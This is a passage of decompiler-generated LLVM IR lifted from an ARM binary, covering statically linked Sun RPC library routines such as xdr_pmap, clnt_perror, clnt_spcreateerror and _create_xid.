  %v1_32e04 = inttoptr i32 %v0_32e04 to i32*
  %v2_32e04 = load i32, i32* %v1_32e04, align 4
  store i32 %v2_32e04, i32* @r3, align 4
  %v7_32e08 = icmp eq i32 %v2_32e04, 98
  br i1 %v7_32e08, label %dec_label_pc_32d98, label %dec_label_pc_32e10

dec_label_pc_32e10:                               ; preds = %dec_label_pc_32e04, %dec_label_pc_32dd8, %dec_label_pc_32d3c
  %v0_32e10 = phi i32 [ %v0_32e10.pre, %dec_label_pc_32d3c ], [ %v0_32ddc, %dec_label_pc_32dd8 ], [ %v0_32ddc, %dec_label_pc_32e04 ]
  store i32 %v12_32cf8, i32* @r7, align 4
  store i32 %v27_32cf8, i32* @lr, align 4
  ret i32 %v0_32e10

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_32ddc, { 1, 2, 0 }
  uselistorder i32 %v3_32db0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i16 256, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 98, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 1, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i32 96, { 3, 33, 26, 27, 34, 29, 30, 31, 4, 1, 2, 5, 35, 36, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 32, 37, 38, 22, 23, 24, 25, 28 }
  uselistorder i16* null, { 1, 0 }
  uselistorder label %dec_label_pc_32dd8, { 1, 0 }
  uselistorder label %dec_label_pc_32d74, { 1, 0 }
}

define i32 @function_32e28(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_32e28:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_32e28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_32e28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_32e28
  store i32 %tmp, i32* %arg1, align 4
  %v5_32e28 = load i32, i32* %r0.global-to-local, align 4
  %v6_32e28 = add i32 %v5_32e28, -208432
  %v2_32e2c = load i32, i32* @r7, align 4
  %v5_32e2c = udiv i32 %v2_32e2c, 8
  %v6_32e2c = and i32 %v5_32e2c, %v6_32e28
  store i32 %v6_32e2c, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_32e28, %bb
  %v7_32e2c = phi i32 [ %tmp, %dec_label_pc_32e28 ], [ %v6_32e2c, %bb ]
  ret i32 %v7_32e2c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_32e40 = call i32 @xdr_u_long()
  %v2_32e44 = icmp eq i32 %v0_32e40, 0
  br i1 %v2_32e44, label %dec_label_pc_32e88, label %dec_label_pc_32e4c

dec_label_pc_32e4c:                               ; preds = %entry
  %v0_32e4c = load i32, i32* @r4, align 4
  store i32 %v0_32e4c, i32* @r0, align 4
  %v0_32e50 = load i32, i32* @r5, align 4
  %v1_32e50 = add i32 %v0_32e50, 4
  store i32 %v1_32e50, i32* @r1, align 4
  %v0_32e54 = call i32 @xdr_u_long()
  %v2_32e58 = icmp eq i32 %v0_32e54, 0
  br i1 %v2_32e58, label %dec_label_pc_32e88, label %dec_label_pc_32e60

dec_label_pc_32e60:                               ; preds = %dec_label_pc_32e4c
  %v0_32e60 = load i32, i32* @r4, align 4
  store i32 %v0_32e60, i32* @r0, align 4
  %v0_32e64 = load i32, i32* @r5, align 4
  %v1_32e64 = add i32 %v0_32e64, 8
  store i32 %v1_32e64, i32* @r1, align 4
  %v0_32e68 = call i32 @xdr_u_long()
  %v2_32e6c = icmp eq i32 %v0_32e68, 0
  br i1 %v2_32e6c, label %dec_label_pc_32e88, label %dec_label_pc_32e74

dec_label_pc_32e74:                               ; preds = %dec_label_pc_32e60
  %v0_32e74 = load i32, i32* @r4, align 4
  store i32 %v0_32e74, i32* @r0, align 4
  %v0_32e78 = load i32, i32* @r5, align 4
  %v1_32e78 = add i32 %v0_32e78, 12
  store i32 %v1_32e78, i32* @r1, align 4
  %v0_32e7c = call i32 @xdr_u_long()
  br label %dec_label_pc_32e88

dec_label_pc_32e88:                               ; preds = %entry, %dec_label_pc_32e4c, %dec_label_pc_32e60, %dec_label_pc_32e74
  %storemerge = phi i32 [ %v0_32e7c, %dec_label_pc_32e74 ], [ 0, %dec_label_pc_32e60 ], [ 0, %dec_label_pc_32e4c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_32e88, { 3, 2, 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
dec_label_pc_32eac.lr.ph:
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33664), i32* @ip, align 4
  %v1_32eb0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_32eac

dec_label_pc_32eac:                               ; preds = %dec_label_pc_32eac.lr.ph, %dec_label_pc_32ed0
  %v1_32eb8 = phi i32 [ 0, %dec_label_pc_32eac.lr.ph ], [ %v1_32ed0, %dec_label_pc_32ed0 ]
  %v4_32eac = mul i32 %v1_32eb8, 8
  %v5_32eac = add i32 %v4_32eac, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33664)
  %v6_32eac = inttoptr i32 %v5_32eac to i32*
  %v7_32eac = load i32, i32* %v6_32eac, align 4
  %v9_32eb0 = icmp eq i32 %v7_32eac, %v1_32eb0.pre
  br i1 %v9_32eb0, label %dec_label_pc_32eb8, label %dec_label_pc_32ed0

dec_label_pc_32eb8:                               ; preds = %dec_label_pc_32eac
  %v1_32ebc = add i32 %v4_32eac, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33660)
  %v2_32ebc = inttoptr i32 %v1_32ebc to i32*
  %v3_32ebc = load i32, i32* %v2_32ebc, align 4
  %v2_32ec8 = add i32 %v3_32ebc, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33520)
  ret i32 %v2_32ec8

dec_label_pc_32ed0:                               ; preds = %dec_label_pc_32eac
  %v1_32ed0 = add i32 %v1_32eb8, 1
  %tmp = icmp ult i32 %v1_32ed0, 18
  br i1 %tmp, label %dec_label_pc_32eac, label %dec_label_pc_32edc

dec_label_pc_32edc:                               ; preds = %dec_label_pc_32ed0
  ret i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34096)

; uselistorder directives
  uselistorder label %dec_label_pc_32eac, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v0_32f00 = call i32 @__rpc_thread_variables()
  %v1_32f04 = add i32 %v0_32f00, 156
  %v2_32f04 = inttoptr i32 %v1_32f04 to i32*
  %v3_32f04 = load i32, i32* %v2_32f04, align 4
  store i32 %v3_32f04, i32* @r0, align 4
  %v0_32f08 = call i32 @free()
  ret i32 %v0_32f08
}

define i32 @clnt_perrno(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v0_32f20 = call i32 @__GI_clnt_sperrno()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_32f2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 196) to i32*), align 4
  %v1_32f30 = inttoptr i32 %v4_32f2c to i32*
  %v2_32f30 = load i32, i32* %v1_32f30, align 4
  %v2_32f34 = call i32 @__GI_fputs(i32 %v0_32f20, i32 %v2_32f30)
  ret i32 %v2_32f34
}

define i32 @_buf() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_32f48 = load i32, i32* @r4, align 4
  store i32 %v3_32f48, i32* %stack_var_-8, align 4
  %v0_32f4c = call i32 @__rpc_thread_variables()
  %v1_32f50 = add i32 %v0_32f4c, 156
  %v2_32f50 = inttoptr i32 %v1_32f50 to i32*
  %v3_32f50 = load i32, i32* %v2_32f50, align 4
  %v2_32f54 = icmp eq i32 %v3_32f50, 0
  store i32 %v0_32f4c, i32* @r4, align 4
  br i1 %v2_32f54, label %dec_label_pc_32f60, label %dec_label_pc_32f6c

dec_label_pc_32f60:                               ; preds = %entry
  %v1_32f64 = call i32 @malloc(i32 256)
  %v1_32f68 = load i32, i32* @r4, align 4
  %v2_32f68 = add i32 %v1_32f68, 156
  %v3_32f68 = inttoptr i32 %v2_32f68 to i32*
  store i32 %v1_32f64, i32* %v3_32f68, align 4
  %v0_32f6c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_32f6c

dec_label_pc_32f6c:                               ; preds = %entry, %dec_label_pc_32f60
  %v0_32f6c = phi i32 [ %v0_32f4c, %entry ], [ %v0_32f6c.pre, %dec_label_pc_32f60 ]
  %v1_32f6c = add i32 %v0_32f6c, 156
  %v2_32f6c = inttoptr i32 %v1_32f6c to i32*
  %v3_32f6c = load i32, i32* %v2_32f6c, align 4
  %v2_32f70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_32f70, i32* @r4, align 4
  ret i32 %v3_32f6c

; uselistorder directives
  uselistorder i32 156, { 6, 7, 8, 5, 9, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_32f6c, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-1048 = alloca i32, align 4
  %v3_32f78 = load i32, i32* @r4, align 4
  %v6_32f78 = load i32, i32* @r5, align 4
  %v9_32f78 = load i32, i32* @r6, align 4
  %v12_32f78 = load i32, i32* @r7, align 4
  %v2_32f80 = ptrtoint i32* %stack_var_-1048 to i32
  %v0_32f84 = load i32, i32* @r0, align 4
  store i32 %v0_32f84, i32* @r4, align 4
  %v0_32f88 = call i32 @_buf()
  store i32 %v0_32f88, i32* @r7, align 4
  %v2_32f90 = icmp eq i32 %v0_32f88, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  br i1 %v2_32f90, label %dec_label_pc_33084, label %dec_label_pc_32f9c

dec_label_pc_32f9c:                               ; preds = %entry
  %v0_32f9c = call i32 @__GI___rpc_thread_createerr()
  %v0_32fa4 = load i32, i32* @r4, align 4
  store i32 %v0_32f9c, i32* @r6, align 4
  %v0_32fac = load i32, i32* @r5, align 4
  %v2_32fac = add i32 %v0_32fac, -34068
  %v0_32fb0 = load i32, i32* @r7, align 4
  store i32 %v0_32fb0, i32* @r0, align 4
  %v3_32fb4 = call i32 @sprintf(i32 %v0_32fb0, i32 %v2_32fac, i32 %v0_32fa4)
  %v0_32fb8 = load i32, i32* @r7, align 4
  %v2_32fb8 = add i32 %v0_32fb8, %v3_32fb4
  store i32 %v2_32fb8, i32* %r4.global-to-local, align 4
  %v0_32fbc = load i32, i32* @r6, align 4
  %v1_32fbc = inttoptr i32 %v0_32fbc to i32*
  %v2_32fbc = load i32, i32* %v1_32fbc, align 4
  store i32 %v2_32fbc, i32* @r0, align 4
  %v0_32fc0 = call i32 @__GI_clnt_sperrno()
  store i32 %v0_32fc0, i32* @r1, align 4
  %v0_32fc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_32fcc = inttoptr i32 %v0_32fc8 to i8*
  %v3_32fcc = call i32 @strcpy(i8* %v2_32fcc, i32 %v0_32fc0)
  %v1_32fd0 = inttoptr i32 %v0_32fc8 to i8*
  %v3_32fd4 = call i32 @strlen(i8* %v1_32fd0)
  %v0_32fd8 = load i32, i32* @r6, align 4
  %v1_32fd8 = inttoptr i32 %v0_32fd8 to i32*
  %v2_32fd8 = load i32, i32* %v1_32fd8, align 4
  store i32 %v2_32fd8, i32* %r3.global-to-local, align 4
  %v7_32fdc = icmp eq i32 %v2_32fd8, 12
  %v0_32fe0 = load i32, i32* %r4.global-to-local, align 4
  %v2_32fe0 = add i32 %v0_32fe0, %v3_32fd4
  store i32 %v2_32fe0, i32* %r4.global-to-local, align 4
  br i1 %v7_32fdc, label %dec_label_pc_3302c, label %dec_label_pc_32fe8

dec_label_pc_32fe8:                               ; preds = %dec_label_pc_32f9c
  %v7_32fe8 = icmp eq i32 %v2_32fd8, 14
  br i1 %v7_32fe8, label %dec_label_pc_32ff0, label %dec_label_pc_33074

dec_label_pc_32ff0:                               ; preds = %dec_label_pc_32fe8
  %v0_32ff8 = load i32, i32* @r5, align 4
  %v2_32ff8 = add i32 %v0_32ff8, -34060
  store i32 %v2_32ff8, i32* @r1, align 4
  %v2_32ffc = inttoptr i32 %v2_32fe0 to i8*
  %v3_32ffc = call i32 @strcpy(i8* %v2_32ffc, i32 %v2_32ff8)
  %v0_33000 = load i32, i32* %r4.global-to-local, align 4
  %v1_33000 = inttoptr i32 %v0_33000 to i8*
  %v3_33004 = call i32 @strlen(i8* %v1_33000)
  %v2_33008 = add i32 %v0_33000, %v3_33004
  store i32 %v2_33008, i32* @r4, align 4
  %v0_3300c = load i32, i32* @r6, align 4
  %v1_3300c = add i32 %v0_3300c, 4
  %v2_3300c = inttoptr i32 %v1_3300c to i32*
  %v3_3300c = load i32, i32* %v2_3300c, align 4
  store i32 %v3_3300c, i32* @r0, align 4
  %v0_33010 = call i32 @__GI_clnt_sperrno()
  store i32 %v0_33010, i32* @r1, align 4
  %v0_33018 = load i32, i32* @r4, align 4
  %v2_3301c = inttoptr i32 %v0_33018 to i8*
  %v3_3301c = call i32 @strcpy(i8* %v2_3301c, i32 %v0_33010)
  %v0_33020 = load i32, i32* @r4, align 4
  %v1_33020 = inttoptr i32 %v0_33020 to i8*
  %v3_33024 = call i32 @strlen(i8* %v1_33020)
  br label %dec_label_pc_33070

dec_label_pc_3302c:                               ; preds = %dec_label_pc_32f9c
  %v0_33034 = load i32, i32* @r5, align 4
  %v2_33034 = add i32 %v0_33034, -34060
  store i32 %v2_33034, i32* @r1, align 4
  %v2_33038 = inttoptr i32 %v2_32fe0 to i8*
  %v3_33038 = call i32 @strcpy(i8* %v2_33038, i32 %v2_33034)
  %v0_3303c = load i32, i32* %r4.global-to-local, align 4
  %v1_3303c = inttoptr i32 %v0_3303c to i8*
  %v3_33040 = call i32 @strlen(i8* %v1_3303c)
  store i32 1024, i32* @r2, align 4
  %v2_33048 = add i32 %v0_3303c, %v3_33040
  store i32 %v2_33048, i32* @r4, align 4
  %v0_33050 = load i32, i32* @r6, align 4
  %v1_33050 = add i32 %v0_33050, 8
  %v2_33050 = inttoptr i32 %v1_33050 to i32*
  %v3_33050 = load i32, i32* %v2_33050, align 4
  store i32 %v3_33050, i32* @r0, align 4
  %v3_33054 = call i32 @__GI___glibc_strerror_r(i32 %v3_33050, i32 %v2_32f80, i32 1024)
  %v0_33058 = load i32, i32* @r4, align 4
  store i32 %v2_32f80, i32* @r1, align 4
  %v2_33060 = inttoptr i32 %v0_33058 to i8*
  %v3_33060 = call i32 @strcpy(i8* %v2_33060, i32 %v2_32f80)
  %v0_33064 = load i32, i32* @r4, align 4
  %v1_33064 = inttoptr i32 %v0_33064 to i8*
  %v3_3306c = call i32 @strlen(i8* %v1_33064)
  br label %dec_label_pc_33070

dec_label_pc_33070:                               ; preds = %dec_label_pc_32ff0, %dec_label_pc_3302c
  %storemerge = phi i32 [ %v3_3306c, %dec_label_pc_3302c ], [ %v3_33024, %dec_label_pc_32ff0 ]
  %v0_33070 = load i32, i32* @r4, align 4
  %v2_33070 = add i32 %v0_33070, %storemerge
  store i32 %v2_33070, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_33074

dec_label_pc_33074:                               ; preds = %dec_label_pc_32fe8, %dec_label_pc_33070
  %v2_33078 = phi i32 [ %v2_32fe0, %dec_label_pc_32fe8 ], [ %v2_33070, %dec_label_pc_33070 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_33078 = add i32 %v2_33078, 1
  %v4_33078 = inttoptr i32 %v3_33078 to i8*
  store i8 0, i8* %v4_33078, align 1
  %v0_3307c = load i32, i32* %r3.global-to-local, align 4
  %v1_3307c = add i32 %v0_3307c, 10
  store i32 %v1_3307c, i32* %r3.global-to-local, align 4
  %v1_33080 = trunc i32 %v1_3307c to i8
  %v2_33080 = load i32, i32* %r4.global-to-local, align 4
  %v3_33080 = inttoptr i32 %v2_33080 to i8*
  store i8 %v1_33080, i8* %v3_33080, align 1
  %v0_33084.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_33084

dec_label_pc_33084:                               ; preds = %entry, %dec_label_pc_33074
  %v0_33084 = phi i32 [ 0, %entry ], [ %v0_33084.pre, %dec_label_pc_33074 ]
  store i32 %v3_32f78, i32* %r4.global-to-local, align 4
  store i32 %v6_32f78, i32* @r5, align 4
  store i32 %v9_32f78, i32* @r6, align 4
  store i32 %v12_32f78, i32* @r7, align 4
  ret i32 %v0_33084

; uselistorder directives
  uselistorder i32 %v2_32f80, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 1, 0 }
  uselistorder label %dec_label_pc_33084, { 1, 0 }
  uselistorder label %dec_label_pc_33074, { 1, 0 }
  uselistorder label %dec_label_pc_33070, { 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 71892, i32* @r4, align 4
  %v0_330ac = call i32 @clnt_spcreateerror()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_330b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 196) to i32*), align 4
  %v1_330bc = inttoptr i32 %v4_330b8 to i32*
  %v2_330bc = load i32, i32* %v1_330bc, align 4
  %v2_330c0 = call i32 @__GI_fputs(i32 %v0_330ac, i32 %v2_330bc)
  ret i32 %v2_330c0
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v6_330d4 = load i32, i32* @r5, align 4
  %v12_330d4 = load i32, i32* @r7, align 4
  %v15_330d4 = load i32, i32* @r8, align 4
  %v18_330d4 = load i32, i32* @lr, align 4
  %v0_330dc = load i32, i32* @r0, align 4
  store i32 %v0_330dc, i32* @r4, align 4
  %v0_330e0 = load i32, i32* @r1, align 4
  store i32 %v0_330e0, i32* @r5, align 4
  %v0_330e4 = call i32 @_buf()
  store i32 %v0_330e4, i32* @r8, align 4
  %v2_330ec = icmp eq i32 %v0_330e4, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br i1 %v2_330ec, label %dec_label_pc_332a8, label %dec_label_pc_330f8

dec_label_pc_330f8:                               ; preds = %entry
  %v0_330fc = load i32, i32* @r4, align 4
  %v1_330fc = add i32 %v0_330fc, 4
  %v2_330fc = inttoptr i32 %v1_330fc to i32*
  %v3_330fc = load i32, i32* %v2_330fc, align 4
  store i32 %v3_330fc, i32* %r3.global-to-local, align 4
  %v1_33108 = add i32 %v3_330fc, 8
  %v2_33108 = inttoptr i32 %v1_33108 to i32*
  %v3_33108 = load i32, i32* %v2_33108, align 4
  store i32 209172, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_33108)
  %v0_33118 = load i32, i32* @r5, align 4
  %v0_3311c = load i32, i32* @r7, align 4
  %v2_3311c = add i32 %v0_3311c, -34068
  %v0_33120 = load i32, i32* @r8, align 4
  store i32 %v0_33120, i32* @r0, align 4
  %v3_33124 = call i32 @sprintf(i32 %v0_33120, i32 %v2_3311c, i32 %v0_33118)
  %v0_33128 = load i32, i32* @r8, align 4
  %v2_33128 = add i32 %v0_33128, %v3_33124
  store i32 %v2_33128, i32* @r4, align 4
  %v3_3312c = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_3312c, i32* @r0, align 4
  %v0_33130 = call i32 @__GI_clnt_sperrno()
  store i32 %v0_33130, i32* @r1, align 4
  %v0_33138 = load i32, i32* @r4, align 4
  %v2_3313c = inttoptr i32 %v0_33138 to i8*
  %v3_3313c = call i32 @strcpy(i8* %v2_3313c, i32 %v0_33130)
  %v0_33140 = load i32, i32* @r4, align 4
  %v1_33140 = inttoptr i32 %v0_33140 to i8*
  %v3_33144 = call i32 @strlen(i8* %v1_33140)
  %v3_33148 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_33148, i32* %r3.global-to-local, align 4
  %v0_3314c = load i32, i32* @r4, align 4
  %v2_3314c = add i32 %v0_3314c, %v3_33144
  store i32 %v2_3314c, i32* @r5, align 4
  %tmp = icmp ult i32 %v3_33148, 18
  br i1 %tmp, label %bb, label %dec_label_pc_3327c

bb:                                               ; preds = %dec_label_pc_330f8
  %v7_33154 = mul i32 %v3_33148, 4
  %v8_33154 = add i32 %v7_33154, ptrtoint (i32* @global_var_3315c.2184 to i32)
  call void @__pseudo_branch(i32 %v8_33154)
  %v0_33284.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_3327c

dec_label_pc_3327c:                               ; preds = %bb, %dec_label_pc_330f8
  %v0_33284 = phi i32 [ %v0_33284.pre, %bb ], [ %v2_3314c, %dec_label_pc_330f8 ]
  %v0_33280 = load i32, i32* @r7, align 4
  %v2_33280 = add i32 %v0_33280, -33952
  store i32 %v0_33284, i32* @r0, align 4
  %v3_33290 = call i32 @sprintf(i32 %v0_33284, i32 %v2_33280, i32 %tmp4)
  %v0_33294 = load i32, i32* @r5, align 4
  %v2_33294 = add i32 %v0_33294, %v3_33290
  store i32 %v2_33294, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_3329c = add i32 %v2_33294, 1
  %v4_3329c = inttoptr i32 %v3_3329c to i8*
  store i8 0, i8* %v4_3329c, align 1
  %v0_332a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_332a0 = add i32 %v0_332a0, 10
  store i32 %v1_332a0, i32* %r3.global-to-local, align 4
  %v1_332a4 = trunc i32 %v1_332a0 to i8
  %v2_332a4 = load i32, i32* %r5.global-to-local, align 4
  %v3_332a4 = inttoptr i32 %v2_332a4 to i8*
  store i8 %v1_332a4, i8* %v3_332a4, align 1
  %v0_332a8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_332a8

dec_label_pc_332a8:                               ; preds = %entry, %dec_label_pc_3327c
  %v0_332a8 = phi i32 [ 0, %entry ], [ %v0_332a8.pre, %dec_label_pc_3327c ]
  store i32 %v6_330d4, i32* @r5, align 4
  store i32 %v12_330d4, i32* @r7, align 4
  store i32 %v15_330d4, i32* @r8, align 4
  store i32 %v18_330d4, i32* @lr, align 4
  ret i32 %v0_332a8

; uselistorder directives
  uselistorder i32 %v0_33284, { 1, 0 }
  uselistorder i32 %v3_33148, { 1, 0, 2 }
  uselistorder i32 18, { 0, 1, 4, 5, 6, 2, 3 }
  uselistorder i32 (i8*, i32)* @strcpy, { 6, 1, 2, 3, 4, 5, 21, 22, 23, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @sprintf, { 22, 21, 23, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_332a8, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 71324, i32* @r4, align 4
  %v0_332e4 = call i32 @__GI_clnt_sperror()
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_332f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 196) to i32*), align 4
  %v1_332f4 = inttoptr i32 %v4_332f0 to i32*
  %v2_332f4 = load i32, i32* %v1_332f4, align 4
  %v2_332f8 = call i32 @__GI_fputs(i32 %v0_332e4, i32 %v2_332f4)
  ret i32 %v2_332f8

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 196) to i32*), { 1, 2, 3, 0 }
}

define i32 @_create_xid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v6_3330c = load i32, i32* @r5, align 4
  %v9_3330c = load i32, i32* @r6, align 4
  %v15_3330c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 56000), i32* @r4, align 4
  %v2_33328 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_33328, i32* @r7, align 4
  store i32 56024, i32* @r6, align 4
  %v4_33340 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_33340)
  %v0_33354 = load i32, i32* @r5, align 4
  %v2_33354 = add i32 %v0_33354, 36
  %v3_33354 = inttoptr i32 %v2_33354 to i32*
  %v4_33354 = load i32, i32* %v3_33354, align 4
  call void @__pseudo_branch(i32 %v4_33354)
  %v0_33360 = load i32, i32* @r5, align 4
  %v1_33360 = load i32, i32* @r6, align 4
  %v2_33360 = add i32 %v1_33360, %v0_33360
  %v3_33360 = inttoptr i32 %v2_33360 to i32*
  %v4_33360 = load i32, i32* %v3_33360, align 4
  %v2_33364 = icmp eq i32 %v4_33360, 0
  br i1 %v2_33364, label %dec_label_pc_3336c, label %dec_label_pc_33394

dec_label_pc_3336c:                               ; preds = %entry
  %v2_3336c = ptrtoint i32* %stack_var_-36 to i32
  %v2_33370 = call i32 @gettimeofday(i32 %v2_3336c, i32 0)
  %v2_33378 = load i32, i32* %stack_var_-36, align 4
  %v2_33380 = xor i32 %v2_33378, %tmp
  %v0_33384 = load i32, i32* @r5, align 4
  %v2_33384 = add i32 %v0_33384, 56032
  %v2_33388 = trunc i32 %v2_33380 to i16
  %v3_33388 = call i32 @__GI_srand48_r(i16 %v2_33388, i32 %v2_33384)
  %v1_33390 = load i32, i32* @r5, align 4
  %v2_33390 = load i32, i32* @r6, align 4
  %v3_33390 = add i32 %v2_33390, %v1_33390
  %v4_33390 = inttoptr i32 %v3_33390 to i32*
  store i32 1, i32* %v4_33390, align 4
  %v0_3339c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_33394

dec_label_pc_33394:                               ; preds = %entry, %dec_label_pc_3336c
  %v0_3339c = phi i32 [ %v0_33360, %entry ], [ %v0_3339c.pre, %dec_label_pc_3336c ]
  %v2_33398 = ptrtoint i32* %stack_var_-28 to i32
  %v2_3339c = add i32 %v0_3339c, 56032
  %v2_333a0 = call i32 @lrand48_r(i32 %v2_3339c, i32 %v2_33398)
  %v0_333b0 = load i32, i32* @r5, align 4
  %v2_333b0 = add i32 %v0_333b0, 76
  %v3_333b0 = inttoptr i32 %v2_333b0 to i32*
  %v4_333b0 = load i32, i32* %v3_333b0, align 4
  call void @__pseudo_branch(i32 %v4_333b0)
  %v3_333bc = load i32, i32* %stack_var_-28, align 4
  store i32 %v6_3330c, i32* @r5, align 4
  store i32 %v9_3330c, i32* @r6, align 4
  store i32 %v15_3330c, i32* @lr, align 4
  ret i32 %v3_333bc

; uselistorder directives
  uselistorder i32 %v0_33360, { 1, 0 }
  uselistorder i32 76, { 9, 0, 10, 11, 12, 13, 1, 14, 15, 7, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 2, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 3, 41, 42, 4, 5, 51, 52, 53, 54, 6, 43, 8, 44, 45, 46, 49, 50, 47, 48 }
  uselistorder i32 164, { 4, 0, 3, 5, 6, 20, 21, 23, 7, 8, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 22 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 27, 18, 19, 20, 21, 22, 23, 24, 28, 25, 26 }
  uselistorder label %dec_label_pc_33394, { 1, 0 }
}

define i32 @function_333d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_333d4:
  %v0_333d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_333d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_333d4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_333d4, %bb
  %v4_333e8 = phi i32 [ %arg1, %dec_label_pc_333d4 ], [ 0, %bb ]
  ret i32 %v4_333e8

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v1_333ec = load i32, i32* @r0, align 4
  ret i32 %v1_333ec
}

